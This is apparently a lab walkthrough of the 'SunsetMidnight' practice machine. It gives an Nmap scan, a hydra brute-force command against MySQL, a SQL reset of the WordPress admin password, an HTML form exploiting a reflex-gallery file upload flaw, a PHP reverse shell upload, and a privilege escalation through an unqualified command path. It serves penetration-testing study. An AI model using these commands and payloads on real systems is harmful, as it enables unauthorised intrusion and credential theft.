#### Enumeration

```
# Nmap 7.92 scan initiated Sun Feb 27 00:15:18 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.128.88/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.128.88/scans/xml/_full_tcp_nmap.xml 192.168.128.88
Warning: 192.168.128.88 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.128.88
Host is up, received user-set (0.28s latency).
Scanned at 2022-02-27 00:15:18 EST for 1752s
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        REASON      VERSION
22/tcp    open     ssh            syn-ack     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm5CuyxbQ0hflsMDQe6CKt3H41UNbqR/7dqfRp2OkKxsOZ8sM0gHgGPU41j+b6ByHnkBSYi+NEIV+VXcnpGraaGhn/3mjF5uvgVdei5n2O9ZgX6Vuefk4o6Q3DL2DsEtOCaepPimfSX1TetQUjWc8f9ciax4Za5FdCjZL/L1eV211Aidf93iROG7y6GUzRyMGBGQTPUnZK39dTmJEpo+qprHmv2LCG84azdXwTGR1YilTVtrgnkMUyrq6gnuins4fxLkm5OwnznuL8nQgIWfH9I0YGuFkqf3pR1VHFeaOJnFMh9XfH58/BzlzLVtcaKYP45ARztIouRVtgHseXmW7X
|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOByIes6+atfEdAfAg4dy8LGa1TrPSa7sVSWSkEc5X+/932xaylSrtw/EvgKnGFW4zxSDNywRWtsJ6PN2iTRujQ=
|   256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILUvvXW/tfdzAPwVMpeX7n7D3ObXCvVg2fpFsKc3htfy
80/tcp    open     http           syn-ack     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://sunset-midnight/
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
3306/tcp  open     mysql          syn-ack     MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 3084
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, FoundRows, SupportsLoadDataLocal, SupportsCompression, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: D-S:h|X">Rd|c\&Ejf?G
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
3886/tcp  filtered nei-management no-response
3906/tcp  filtered topovista-data no-response
5693/tcp  filtered rbsystem       no-response
15603/tcp filtered unknown        no-response
21709/tcp filtered unknown        no-response
25388/tcp filtered unknown        no-response
26534/tcp filtered unknown        no-response
28728/tcp filtered unknown        no-response
36844/tcp filtered unknown        no-response
37564/tcp filtered unknown        no-response
39569/tcp filtered unknown        no-response
40948/tcp filtered unknown        no-response
45677/tcp filtered unknown        no-response
46313/tcp filtered unknown        no-response
47401/tcp filtered unknown        no-response
50113/tcp filtered unknown        no-response
50225/tcp filtered unknown        no-response
50364/tcp filtered unknown        no-response
53270/tcp filtered unknown        no-response
61622/tcp filtered unknown        no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 27 00:44:30 2022 -- 1 IP address (1 host up) scanned in 1752.38 seconds

```

Browsing to port 80 HTTP service through IP address fails and it returns a domain name ```sunset-midnight```. We need to modify DNS settings first.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_13h44m48s_001.png)

We add a DNS rule in ```/etc/hosts``` file.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_13h49m45s_002.png)
 
Browsing to port 80 HTTP service again, and this time we see a webpage built with WordPress.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_13h54m51s_003.png)

The WordPress plugin we find is ```Simply Poll``` but its real version is 1.5, not 1.4.1 which has a vulnerability.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h06m07s_004.png)

After a lot of searching, I can't find the breakthrough of the WordPress website. So I move to port 3306 and try to brute-force database password.

I try to use the account ```wordpress``` but fail. [(*understanding max_connect_errors*)](https://www.virtual-dba.com/blog/mysql-max-connect-errors/)

```
hydra -l root -P ~/Documents/rockyou.txt -s 3306 -t 4 -f 192.168.128.88 mysql
```

Change the account to root to try and we successfully get the password.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h49m01s_005.png)

Browsing to WordPress database we We can change the password to ```admin123```.

```
UPDATE wp_users SET user_pass = MD5('admin123') WHERE ID = '1';
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h52m50s_006.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h53m03s_007.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h53m26s_008.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h54m55s_009.png)

Logging in to WordPress dashboard. We can [upload and activate a malicious plugin](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#uploading-and-activating-malicious-plugin).

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h10m32s_010.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h11m44s_011.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h13m11s_012.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h13m34s_013.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h18m32s_014.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h22m38s_015.png)

According to the [exploit](https://www.exploit-db.com/exploits/36374) instructions we create an html file for uploading.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h23m25s_016.png)

```html
<form method="POST" action="http://sunset-midnight/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2022&Month=02" enctype="multipart/form-data" >
    <input type="file" name="qqfile"><br>
    <input type="submit" name="Submit" value="Pwn!">
</form>
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h24m19s_017.png)

Now let's prepare a [php file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) with the reverse shell command.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h29m08s_018.png)

Use firefox to open our test.html file and upload the php malicious file.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h32m46s_019.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h33m10s_020.png)

Start listening to 80 port and browse to the address indicated by the vulnerability.

```
http://sunset-midnight/wp-content/uploads/2022/02/php-reverse-shell.php
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h34m54s_021.png)

#### Priviledge Escalation

Checking the ```wp-config.php``` first.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h52m27s_022.png)

Trying to use the credential to login through ssh.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h56m00s_023.png)

We find an unknown binary in the scan results of linpeas.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_17h00m41s_024.png)

Checking this unknown binary reveals that it executes a command with an unspecified path.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_17h03m46s_025.png)

We create our service to run the malicious code.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_17h09m59s_026.png)
